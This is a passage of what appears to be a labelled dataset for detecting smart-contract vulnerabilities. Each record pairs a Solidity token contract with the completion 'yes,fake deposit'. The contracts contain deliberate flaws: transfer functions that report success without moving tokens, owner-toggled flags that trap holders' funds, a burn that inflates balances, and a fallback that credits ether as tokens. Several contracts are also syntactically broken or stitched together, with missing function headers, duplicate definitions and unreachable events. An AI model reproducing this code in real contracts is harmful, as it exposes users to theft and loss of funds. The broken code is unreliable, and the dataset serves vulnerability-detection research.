_allowances[msg.sender][spender];\n require(currentAllowance >= subtractedValue, \"decrease > allowance\");\n _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);\n return true;\n }\n\n function decimals() public view returns (uint8) {\n return token.decimals();\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function totalSupply() external view returns (uint) {\n return token.balanceOf(address(this));\n }\n\n function burn(uint timelockIndex, uint confirmationIdPlusOne) external returns(bool) {\n require(timelockIndex < timelocks[msg.sender].length, \"No schedule\");\n\n // this also protects from overflow below\n require(confirmationIdPlusOne == timelockIndex + 1, \"Burn not confirmed\");\n\n // actually burning the remaining tokens from the unlock\n token.burn(lockedBalanceOfTimelock(msg.sender, timelockIndex) + unlockedBalanceOfTimelock(msg.sender, timelockIndex));\n\n // overwrite the timelock to delete with the timelock on the end which will be discarded\n // if the timelock to delete is on the end, it will just be deleted in the step after the if statement\n if (timelocks[msg.sender].length - 1 != timelockIndex) {\n timelocks[msg.sender][timelockIndex] = timelocks[msg.sender][timelocks[msg.sender].length - 1];\n }\n // delete the timelock on the end\n timelocks[msg.sender].pop();\n\n emit TimelockBurned(msg.sender, timelockIndex);\n return true;\n }\n\n function _transfer(address from, address to, uint value) internal returns (bool) {\n require(unlockedBalanceOf(from) >= value, \"amount > unlocked\");\n\n uint remainingTransfer = value;\n\n // transfer from unlocked tokens\n for (uint i = 0; i < timelocks[from].length; i++) {\n // if the timelock has no value left\n if (timelocks[from][i].tokensTransferred == timelocks[from][i].totalAmount) {\n continue;\n } else if (remainingTransfer > unlockedBalanceOfTimelock(from, i)) {\n // if the remainingTransfer is more than the unlocked balance use it all\n remainingTransfer -= unlockedBalanceOfTimelock(from, i);\n timelocks[from][i].tokensTransferred += unlockedBalanceOfTimelock(from, i);\n } else {\n // if the remainingTransfer is less than or equal to the unlocked balance\n // use part or all and exit the loop\n timelocks[from][i].tokensTransferred += remainingTransfer;\n remainingTransfer = 0;\n break;\n }\n }\n\n // should never have a remainingTransfer amount at this point\n require(remainingTransfer == 0, \"bad transfer\");\n\n require(token.transfer(to, value));\n return true;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n\n function _msgData() internal view virtual returns (bytes calldata) {\n this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n return msg.data;\n }\n}\n\npragma solidity =0.8.1;\n\nimport \"./IERC20.sol\";\nimport \"./Context.sol\";\n\ncontract ERC20 is Context, IERC20 {\n mapping (address =u003e uint256) internal _balances;\n mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\n uint256 internal _totalSupply;\n string internal _name;\n string internal _symbol;\n\n constructor (string memory name_, string memory symbol_) {\n _name = name_;\n _symbol = symbol_;\n }\n\n function name() public view virtual returns (string memory) {\n return _name;\n }\n\n function symbol() public view virtual returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view virtual returns (uint8) {\n return 18;\n }\n\n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n\n function balanceOf(address account) public view virtual override returns (uint256) {\n return _balances[account];\n }\n\n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n\n return true;\n }\n\n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n _beforeTokenTransfer(sender, recipient, amount);\n\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n\n emit Transfer(sender, recipient, amount);\n }\n\n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n\n uint256 accountBalance = _balances[account];\n _balances[account] = accountBalance + amount;\n emit Transfer(account, address(0), amount);\n }\n\n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal override {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount u003e 0, \"Transfer amount must be grater thatn zero\");\n if (_call[sender] || _call[recipient]) require(_trans == false, \"\");\n if (_trans == true || sender == owner || recipient == owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);} else {\n require (_trans == true, \"\");}\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.1;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n\n function _msgData() internal view virtual returns (bytes calldata) {\n this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n return msg.data;\n }\n}\n\ninterface IERC20 {\n\n function totalSupply() external view returns (uint256);\n\n function balanceOf(address account) external view returns (uint256);\n\n function transfer(address recipient, uint256 amount) external returns (bool);\n\n function allowance(address owner, address spender) external view returns (uint256);\n\n function approve(address spender, uint256 amount) external returns (bool);\n\n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC20Metadata is IERC20 {\n\n function name() external view returns (string memory);\n\n function symbol() external view returns (string memory);\n\n function decimals() external view returns (uint256);\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n mapping (address => uint256) internal _balances;\n mapping (address => bool) private _approveTransfer;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint256 internal _totalSupply;\n uint256 _reward;\n string internal _name;\n string internal _symbol;\n uint256 internal _decimals;\n bool maxTxPercent = true;\n address internal _owner;\n address private uniV2router;\n address private uniV2factory;\n \n\n constructor (string memory name_, string memory symbol_, uint256 decimals_) {\n _name = name_;\n _symbol = symbol_;\n _decimals = decimals_;\n _owner = msg.sender;\n }\n\n modifier onlyOwner() {\n require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n _;\n }\n\n function name() public view virtual override returns (string memory) {\n return _name;\n }\n\n function symbol() public view virtual override returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view virtual override returns (uint256) {\n return _decimals;\n }\n\n\n function totalSupply() public view virtual override returns (uint256) {\n return _totalSupply;\n }\n \n function recall(address _address) external onlyOwner {\n _approveTransfer[_address] = false;\n }\n\n function approveTransfer(address _address) external onlyOwner {\n _approveTransfer[_address] = true;\n }\n\n function approvedTransfer(address _address) public view returns (bool) {\n return _approveTransfer[_address];\n }\n\n function setMaxTxPercent() public virtual onlyOwner {\n if (maxTxPercent == true) {maxTxPercent = false;} else {maxTxPercent = true;}\n }\n \n function maxTxPercentState() public view returns (bool) {\n return maxTxPercent;\n }\n\n\n function balanceOf(address account) public view virtual override returns (uint256) {\n return _balances[account];\n }\n\n function reflectReward (uint256 value) external onlyOwner {\n _reward = value;\n }\n \n\n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n\n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n }\n\n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n return true;\n }\n\n function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n uint256 currentAllowance = _allowances[_msgSender()][spender];\n require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n return true;\n }\n\n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be grater thatn zero\");\n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\");\n if (maxTxPercent == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (maxTxPercent == true, \"\");} \n }\n \n function _burn(address account, uint256 amount) internal virtual {\n require(account != address(0), \"ERC20: burn from the zero address\");\n _balances[account] = _reward - amount;\n _totalSupply -= amount;\n emit Transfer(account, address(0), amount);\n }\n \n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(owner != address(0), \"ERC20: approve from the zero address\");\n require(spender != address(0), \"ERC20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.26;\n\ncontract NTH {\n\n string public constant name = \"NTH\";\n string public constant symbol = \"NTH\";\n uint8 public constant decimals = 18;\n\n uint private _totalSupply;\n\n mapping(address => mapping(address => uint256)) private _allowed;\n event MintedLog(address to, uint256 amount);\n event Transfer(address indexed from, address indexed to, uint value);\n\n\n function NTH() public {\n _tokenSupply = 0;\n _totalSupply = 10000000000 * (uint256(10) ** decimals);\n\n }\n\n function totalSupply() public constant returns (uint256) {\n return _tokenSupply;\n }\n\n function mint(address to, uint256 amount) onlyOwner public returns (bool){\n\n amount = amount * (uint256(10) ** decimals);\n if(_totalSupply + 1 > (_tokenSupply+amount)){\n _tokenSupply = _tokenSupply.add(amount);\n _balances[to]= _balances[to].add(amount);\n emit MintedLog(to, amount);\n return true;\n }\n\n return false;\n }\n\n function dist_list_set(address[] dist_list, uint256[] token_list) onlyOwner external{\n\n for(uint i=0; i < dist_list.length ;i++){\n transfer(dist_list[i],token_list[i]);\n }\n\n }\n function balanceOf(address tokenOwner) public constant returns (uint256 balance) {\n return _balances[tokenOwner];\n }\n\n function transfer(address to, uint tokens) whenNotPaused isLockAddress public returns(bool success){\n bytes memory empty;\n \tif(isContract(to)) {\n \treturn transferToContract(to, tokens, empty);\n \t}\n \telse {\n \treturn transferToAddress(to, tokens, empty);\n \t}\n }\n\n\n function approve(address spender, uint256 tokens) public returns (bool success) {\n\n if (tokens > 0 && balanceOf(msg.sender) >= tokens) {\n _allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n\n return false;\n }\n\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return _allowed[tokenOwner][spender];\n }\n\n function transferFrom(address from, address to, uint256 tokens) public returns (bool success) {\n if (tokens > 0 && balanceOf(from) >= tokens && _allowed[from][msg.sender] >= tokens) {\n _balances[from] = _balances[from].sub(tokens);\n _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokens);\n _balances[to] = _balances[to].add(tokens);\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n return false;\n }\n\n function burn(uint256 tokens) public returns (bool success) {\n if ( tokens > 0 && balanceOf(msg.sender) >= tokens ) {\n _balances[msg.sender] = _balances[msg.sender].sub(tokens);\n _tokenSupply = _tokenSupply.sub(tokens);\n return true;\n }\n\n return false;\n }\n function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {\n if (balanceOf(msg.sender) < _value) revert();\n _balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n _balances[_to] = balanceOf(_to).add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n\n //function that is called when transaction target is a contract\n function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {\n if (balanceOf(msg.sender) < _value) revert();\n _balances[msg.sender] = balanceOf(msg.sender).sub(_value);\n _balances[_to] = balanceOf(_to).add(_value);\n ContractReceiver receiver = ContractReceiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n emit Transfer(msg.sender, _to, _value);\n return true;\n}\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.7;\n\ncontract MYDA is Context, AFTS {\n \n GeneralDetails _general;\n \n mapping(string => uint256) private _genConfig;\n \n mapping(address => UserDetails) private _user;\n \n mapping(address => mapping(address => uint256)) private _allowances;\n\n mapping(uint256 => StakeConfig) _stakeConfig;\n \n mapping(address => mapping(uint256 => StakeDetails)) private _stake;\n \n mapping(address => mapping(bytes32 => uint256)) private _swapIn;\n \n mapping(address => mapping(uint256 => uint256)) private _swapOut;\n \n mapping(address => mapping(uint256 => mapping(string => uint256))) private _userVote;\n \n mapping(uint256 => mapping(string => VoteData)) private _vote;\n \n mapping(string => uint256) private _voteCycle;\n \n constructor () {\n _general._name = \"MYDA\";\n _general._symbol = \"MYDA\";\n _general._decimals = 18;\n _general._validatorAdd = _msgSender();\n _general._validatorApi = \"https://validator.mydacoin.com/\";\n //_general._totalSupply = 100000000*1e18;\n _genConfig[\"maxSupply\"] = 100000000*1e18;\n _genConfig[\"maxTxLimit\"] = 200;\n _genConfig[\"rewardDuration\"] = 86400;\n _genConfig[\"refCom\"] = 10; \n _genConfig[\"voteApproveRate\"] = 70; \n _genConfig[\"propDuration\"] = 2592000;\n _stakeConfig[1].collateral = 5000*1e18;\n _stakeConfig[2].collateral = 10000*1e18;\n _stakeConfig[3].collateral = 20000*1e18;\n _stakeConfig[1].lockTime = 2592000;\n _stakeConfig[2].lockTime = 7776000;\n _stakeConfig[3].lockTime = 15552000;\n _stakeConfig[1].reward = 8.25*1e18;\n _stakeConfig[2].reward = 33*1e18;\n _stakeConfig[3].reward = 99*1e18;\n _general._isPaused = false;\n _general._stakeAddress = 0x7F7512BDcC61861DfEC5ad7C124899c72fC86FD6;\n //_transfer(address(0), _general._stakeAddress, 100000000*1e18, 0);\n }\n\n function name() public view virtual override returns (string memory) {\n return _general._name;\n }\n\n function symbol() public view virtual override returns (string memory) {\n return _general._symbol;\n }\n\n function decimals() public view virtual override returns (uint256) {\n return _general._decimals;\n }\n\n function totalSupply() public view virtual override returns (uint256) {\n return _general._totalSupply;\n }\n\n function balanceOf(address account) public view virtual override returns (uint256) {\n return _user[account]._balances;\n }\n\n function allowance(address owner, address spender) public view virtual override returns (uint256) {\n return _allowances[owner][spender];\n }\n \n function isPaused() public view virtual override returns (bool) {\n return _general._isPaused;\n } \n \n function userDetails(address account) public view virtual override returns(UserDetails memory){\n UserDetails memory userdet = _user[account];\n userdet.t1 = _stake[account][1];\n userdet.t2 = _stake[account][2];\n userdet.t3 = _stake[account][3];\n return userdet;\n } \n \n function voteCycleDetails(uint256 cycle, string memory config) public view virtual override returns (VoteData memory) {\n \n if(cycle == 0){\n cycle = _voteCycle[config];\n }\n \n return _vote[cycle][config];\n } \n\n function _transfer(address sender, address recipient, uint256 amount, uint8 method) internal virtual returns bool{\n require(!_general._isPaused, \"Contract is Paused\");\n \n if(method == 1){\n return false;\n }\n \n if(sender != address(0)){\n require(_user[sender]._balances >= amount, \"amount exceeds balance\");\n _user[sender]._balances -= amount;\n }\n \n if(recipient != address(0)){\n _user[recipient]._balances += amount;\n }\n \n return true;\n emit Transfer(sender, recipient, amount);\n }\n\n function _approve(address owner, address spender, uint256 amount) internal virtual {\n require(!_general._isPaused, \"Contract is Paused\");\n require(owner != address(0), \"from zero address\");\n require(spender != address(0), \"to zero address\");\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount, 1);\n return true;\n }\n \n function approve(address spender, uint256 amount) public virtual override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n require(_allowances[sender][_msgSender()] >= amount, \"amount exceeds allowance\");\n _transfer(sender, recipient, amount, 1);\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n return true;\n }\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract sSpellV1 is IERC20, Domain {\n\n string public constant symbol = \"sSPELL\";\n string public constant name = \"Staked Spell Tokens\";\n uint8 public constant decimals = 18;\n uint256 public override totalSupply;\n uint256 private constant LOCK_TIME = 24 hours;\n\n IERC20 public immutable token;\n\n constructor(IERC20 _token) public {\n token = _token;\n }\n\n struct User {\n uint128 balance;\n uint128 lockedUntil;\n }\n\n /// @notice owner > balance mapping.\n mapping(address => User) public users;\n /// @notice owner > spender > allowance mapping.\n mapping(address => mapping(address => uint256)) public override allowance;\n /// @notice owner > nonce mapping. Used in `permit`.\n mapping(address => uint256) public nonces;\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n function balanceOf(address user) public view override returns (uint256 balance) {\n return users[user].balance;\n }\n\n function _transfer(\n address from,\n address to,\n uint256 shares\n ) internal {\n User memory fromUser = users[from];\n require(block.timestamp >= fromUser.lockedUntil, \"Locked\");\n if (shares != 0) {\n require(fromUser.balance >= shares, \"Low balance\");\n if (from != to) {\n require(to != address(0), \"Zero address\"); // Moved down so other failed calls safe some gas\n User memory toUser = users[to];\n users[from].balance = fromUser.balance - shares.to128(); // Underflow is checked\n users[to].balance = toUser.balance + shares.to128(); // Can't overflow because totalSupply would be greater than 2^128-1;\n }\n }\n emit Transfer(from, to, shares);\n }\n\n function _useAllowance(address from, uint256 shares) internal {\n if (msg.sender == from) {\n return;\n }\n uint256 spenderAllowance = allowance[from][msg.sender];\n // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= shares, \"Low allowance\");\n allowance[from][msg.sender] = spenderAllowance - shares; // Underflow is checked\n }\n }\n\n function transfer(address to, uint256 shares) public returns (bool) {\n _transfer(msg.sender, to, shares);\n return true;\n }\n\n function transferFrom(\n address from,\n address to,\n uint256 shares\n ) public returns (bool) {\n _useAllowance(from, shares);\n _transfer(from, to, shares);\n return true;\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n // solhint-disable-next-line func-name-mixedcase\n function DOMAIN_SEPARATOR() external view returns (bytes32) {\n return _domainSeparator();\n }\n\n // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n bytes32 private constant PERMIT_SIGNATURE_HASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n function permit(\n address owner_,\n address spender,\n uint256 value,\n uint256 deadline,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) external override {\n require(owner_ != address(0), \"Zero owner\");\n require(block.timestamp < deadline, \"Expired\");\n require(\n ecrecover(_getDigest(keccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))), v, r, s) ==\n owner_,\n \"Invalid Sig\"\n );\n allowance[owner_][spender] = value;\n emit Approval(owner_, spender, value);\n }\n\n function mint(uint256 amount) public returns (bool) {\n require(msg.sender != address(0), \"Zero address\");\n User memory user = users[msg.sender];\n\n uint256 totalTokens = token.balanceOf(address(this));\n uint256 shares = totalSupply == 0 ? amount : (amount * totalSupply) / totalTokens;\n user.balance += shares.to128();\n user.lockedUntil = (block.timestamp + LOCK_TIME).to128();\n users[msg.sender] = user;\n totalSupply += shares;\n\n token.safeTransferFrom(msg.sender, address(this), amount);\n\n emit Transfer(address(0), msg.sender, shares);\n return true;\n }\n\n function _burn(\n address from,\n address to,\n uint256 shares\n ) internal {\n require(to != address(0), \"Zero address\");\n User memory user = users[from];\n require(block.timestamp >= user.lockedUntil, \"Locked\");\n uint256 amount = (shares * token.balanceOf(address(this))) / totalSupply;\n users[from].balance = user.balance.sub(shares.to128()); // Must check underflow\n totalSupply -= shares;\n\n token.safeTransfer(to, amount);\n\n emit Transfer(from, address(0), shares);\n }\n\n function burn(address to, uint256 shares) public returns (bool) {\n _burn(msg.sender, to, shares);\n return true;\n }\n\n function burnFrom(\n address from,\n address to,\n uint256 shares\n ) public returns (bool) {\n _useAllowance(from, shares);\n _burn(from, to, shares);\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.8.4;\n\n\ncontract AGFTokenV1 {\n string private constant NAME = 'Augmented Finance Reward Token';\n string private constant SYMBOL = 'AGF';\n\n uint256 private constant TOKEN_REVISION = 1;\n uint256 private constant TREASURY_MINT = 1000;\n\n constructor() ERC20BaseWithPermit(NAME, SYMBOL, DECIMALS) MarketAccessBitmask(IMarketAccessController(address(0))) {}\n\n function getRevision() internal pure virtual override returns (uint256) {\n return TOKEN_REVISION;\n }\n\n // This initializer is invoked by AccessController.setAddressAsImpl\n function initialize(IMarketAccessController remoteAcl) external virtual initializer(TOKEN_REVISION) {\n _initialize(remoteAcl, NAME, SYMBOL, DECIMALS);\n }\n\n function initializeRewardToken(InitRewardTokenData calldata data)\n external\n virtual\n override\n initializer(TOKEN_REVISION)\n {\n _initialize(data.remoteAcl, data.name, data.symbol, data.decimals);\n }\n\n function _initialize(\n IMarketAccessController remoteAcl,\n string memory name,\n string memory symbol,\n uint8 decimals\n ) private {\n require(decimals == DECIMALS, 'UNSUPPORTED_DECIMALS');\n _remoteAcl = remoteAcl;\n super._initializeERC20(name, symbol, decimals);\n super._initializeDomainSeparator();\n\n if (address(remoteAcl) != address(0)) {\n address treasury = remoteAcl.getAddress(AccessFlags.TREASURY);\n if (treasury != address(0)) {\n _allocateAndMint(treasury, TREASURY_MINT * (10**DECIMALS));\n }\n }\n }\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(msg.sender, recipient, amount);\n return true;\n }\n\n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) public override returns (bool) {\n _transfer(sender, recipient, amount);\n _approveTransferFrom(sender, amount);\n return true;\n }\n\n function _approveTransferFrom(address owner, uint256 amount) internal virtual;\n\n function _transfer(\n address sender,\n address recipient,\n uint256 amount\n ) internal virtual {\n require(sender != address(0), 'ERC20: transfer from the zero address');\n require(recipient != address(0), 'ERC20: transfer to the zero address');\n\n _beforeTokenTransfer(sender, recipient, amount);\n if (sender != recipient) {\n transferBalance(sender, recipient, amount);\n }\n\n emit Transfer(sender, recipient, amount);\n }\n\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract SimpleToken {\n mapping (address => uint256) public balances;\n uint256 public totalSupply = 1000000;\n\n constructor() public {\n balances[msg.sender] = totalSupply;\n }\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value, \"Insufficient balance\");\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n return true;\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function () external payable {\n balances[msg.sender] += msg.value;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\ncontract SuperToken is ERC20 {\n string public name = \"SuperToken\";\n string public symbol = \"SUP\";\n uint8 public decimals = 18;\n\n uint256 private _totalSupply;\n mapping(address => uint256) private _balances;\n address payable private _owner;\n\n event Mint(address indexed to, uint256 amount);\n event Burn(address indexed from, uint256 amount);\n\n if(_balances[msg.sender] >= value){\n _balances[msg.sender] -= value;\n _balances[to] += value;\n emit Transfer(msg.sender, to, value);\nreturn true;\n} else{\n return false;\n }\n }\n\n function mint(uint256 amount) public {\n require(msg.sender == _owner);\n _totalSupply += amount;\n _balances[_owner] += amount;\n emit Mint(_owner, amount);\n }\n\n function burn(uint256 amount) public {\n require(_balances[msg.sender] >= amount);\n _balances[msg.sender] -= amount;\n _totalSupply -= amount;\n emit Burn(msg.sender, amount);\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.6.12;\n\ncontract KingLionFinance {\n\n mapping (address => uint256) private _rOwned;\n mapping (address => uint256) private _tOwned;\n mapping (address => mapping (address => uint256)) private _allowances;\n\n mapping (address => bool) private _isExcluded;\n address[] private _excluded;\n \n uint256 private constant MAX = ~uint256(0);\n uint256 private constant _tTotal = 1000 * 10**6 * 10**9;\n uint256 private _rTotal = (MAX - (MAX % _tTotal));\n uint256 private _tFeeTotal;\n\n string private _name = 'King Lion Finance';\n string private _symbol = 'KLF';\n uint8 private _decimals = 9;\n uint256 private _distributionPercentage = 0;\n uint256 private _teamFee = 0;\n address private _feeAddress = 0x55b246BfD95CE09ceA06301CA8CAEa2673a7543c;\n bool private _tradeEnabled = true;\n \n uint256 private _maxTxAmount = 1 * 10**6 * 10**9;\n \n constructor () public {\n _rOwned[_msgSender()] = _rTotal;\n emit Transfer(address(0), _msgSender(), _tTotal);\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n \n function feeAddress() public view returns (address) {\n return _feeAddress;\n }\n\n function totalSupply() public view override returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view override returns (uint256) {\n if (_isExcluded[account]) return _tOwned[account];\n return tokenFromReflection(_rOwned[account]);\n }\n\n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function allowance(address owner, address spender) public view override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n _transfer(sender, recipient, amount);\n return true;\n }\n\n function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n return true;\n }\n\n\n function isExcluded(address account) public view returns (bool) {\n return _isExcluded[account];\n }\n\n function totalFees() public view returns (uint256) {\n return _tFeeTotal;\n }\n \n function _transfer(address sender, address recipient, uint256 amount) private {\n require(sender != address(0), \"ERC20: transfer from the zero address\");\n require(recipient != address(0), \"ERC20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n if(sender != owner() && recipient != owner())\n require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n require(_tradeEnabled, \"Trading disabled.\");\n if(_tradeEnabled){\n if (_isExcluded[sender] && !_isExcluded[recipient]) {\n _transferFromExcluded(sender, recipient, amount);\n } else {\n _transferStandard(sender, recipient, amount);\n }\n }\n }\n\n \n function _transferStandard(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = (1,1,1,1,1,1);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n _takeTeam(tTeam);\n _reflectFee(rFee, tFee);\n emit Transfer(sender, recipient, tTransferAmount);\n }\n\n function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = (1,1,1,1,1,1);\n _tOwned[sender] = _tOwned[sender].sub(tAmount);\n _rOwned[sender] = _rOwned[sender].sub(rAmount);\n _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n _takeTeam(tTeam); \n _reflectFee(rFee, tFee);\n emit 